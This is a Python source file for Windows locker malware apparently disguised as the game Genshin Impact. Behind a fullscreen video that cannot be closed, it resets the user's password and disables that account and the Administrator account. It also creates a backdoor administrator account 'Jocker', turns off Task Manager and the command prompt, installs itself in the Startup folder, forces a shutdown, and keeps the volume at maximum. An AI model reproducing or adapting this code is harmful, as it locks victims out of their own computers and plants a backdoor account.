import sys
import os
import threading
import pygetwindow as gw

from PySide6.QtCore import QUrl, QTimer
from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
from PySide6.QtMultimediaWidgets import QVideoWidget
from PySide6.QtWidgets import QMainWindow, QApplication

from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
import comtypes

# 设置音量
def setAudio(num: float):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
    # 设置音量（0.0到1.0之间的浮点数）
    volume_interface.SetMasterVolumeLevelScalar(num, None)

def getAudioEndpointVolume():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        return volume
    except comtypes.COMError as e:
        print(f"COMError: {e}")
        return None

# 取消静音
def clearMute():
    volume = getAudioEndpointVolume()
    if volume is None:
        print("无法获取音频设备")
        return

    try:
        if volume.GetMute():
            volume.SetMute(0, None)
            print("系统已解除静音")
        else:
            print("系统未处于静音状态")
    except comtypes.COMError as e:
        print(f"COMError: {e}")

class MainWindow(QMainWindow):
    def __init__(self, pt):
        super().__init__()
        self._audio_output = QAudioOutput()
        # 创建媒体播放器对象
        self._player = QMediaPlayer()
        self._player.setAudioOutput(self._audio_output)
        # 创建视频显示部件
        self._video_widget = QVideoWidget()
        # 设置视频显示部件为主窗口的中心部件
        self.setCentralWidget(self._video_widget)
        # 将视频显示部件设置为媒体播放器的视频输出设备
        self._player.setVideoOutput(self._video_widget)
        self.pt = pt

        # 设置定时器，每秒检查一次用户是否回到桌面
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.check_if_on_desktop)
        self.timer.start(500)  # 每秒检查一次

    def check_if_on_desktop(self):
        # 获取当前激活的窗口
        active_window = gw.getActiveWindow()

        # 检查是否是桌面
        if active_window is None or active_window.title == '':
            self.showFullScreen()
            self.raise_()

    def play(self):
        self._player.setSource(QUrl.fromLocalFile(self.pt))
        self._player.play()

    def closeEvent(self, event):
        event.ignore()  # 忽略关闭事件
        self.show()     #


def addEvents():
    while True:
        setAudio(1.0)
        clearMute()

def disableTaskManage(num):
    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')

def setPassword(password):
    os.system('echo %username% > userName')

    file = open('./userName', 'r', encoding='utf-8')
    userName = file.readlines()
    userName = userName[0].split()[0]

    print(userName)

    os.system(f'net user {userName} {password}')
    file.close()
    os.remove('./userName')

    return userName

def copy(file_path, save_path):
    os.system(f'copy {file_path} {save_path}')

def getFilePath(file_name):
    # 获取打包后的可执行文件所在的临时目录
    basePath = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
    # 构建视频文件的绝对路径
    return os.path.join(basePath, file_name)

def disableCMD():
    os.system('reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f')

def disableUser(userName):
    os.system(f'net user {userName} /active:no')

def createUser(userName, password, manager=False):
    if manager:
        os.system(f'net user {userName} {password} /add')
        os.system(f'net localgroup Administrators {userName} /add')
    else:
        os.system(f'net user {userName} {password} /add')

def is_user_on_desktop():
    # 获取当前激活的窗口
    active_window = gw.getActiveWindow()

    # 检查窗口标题是否为空（通常桌面窗口没有标题）
    if active_window and active_window.title == '':
        return True
    return False

def backgroundTasks():
    # 后台任务（运行在辅助线程中）
    setPassword(1145141919810)
    disableTaskManage(1)
    clearMute()
    setAudio(1.0)
    copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
    disableUser(setPassword(1145141919810))
    disableUser('Administrator')
    createUser('Jocker', "0d000721", True)
    os.system('shutdown -s -f -t 150')
    disableCMD()
    addEvents()

def main():
    app = QApplication(sys.argv)

    # 创建主窗口并播放视频
    main_win = MainWindow(getFilePath('video.mp4'))
    available_geometry = main_win.screen().availableGeometry()
    main_win.resize(500, 300)
    main_win.setWindowTitle('原神')
    main_win.showFullScreen()
    main_win.play()

    # 在辅助线程中运行后台任务
    threading.Thread(target=backgroundTasks).start()

    # 在主线程中启动应用程序事件循环
    sys.exit(app.exec())

if __name__ == '__main__':
    # main()
    pass
